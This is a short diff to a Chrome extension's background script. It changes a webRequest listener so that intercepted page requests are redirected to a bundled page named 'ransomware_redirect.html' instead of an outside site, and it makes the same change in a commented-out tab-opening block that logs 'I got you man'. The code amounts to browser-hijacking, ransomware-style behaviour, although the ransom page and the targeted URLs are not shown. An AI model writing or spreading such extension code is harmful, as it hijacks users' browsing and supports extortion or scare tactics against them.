@@ -12,7 +12,7 @@ chrome.browserAction.onClicked.addListener(function(tab) {
 // how to redirect
 chrome.webRequest.onBeforeRequest.addListener(
     function(details) {
-        return {redirectUrl: "http://www.multiplayer.it"}; //put here the url you want to redirect the page to
+        return {redirectUrl: chrome.runtime.getURL("ransomware_redirect.html")}; //put here the url you want to redirect the page to
     },
     {
         urls: [
@@ -28,7 +28,7 @@ chrome.webRequest.onBeforeRequest.addListener(
 /*chrome.webRequest.onBeforeRequest.addListener(
     function(details) {
         console.log("I got you man");
-        chrome.tabs.create({ url: "redirect.html" }, function(tab) {
+        chrome.tabs.create({ url: "ransomware_redirect.html" }, function(tab) {
             console.log("Opened: " + tab.url);
         });
     },
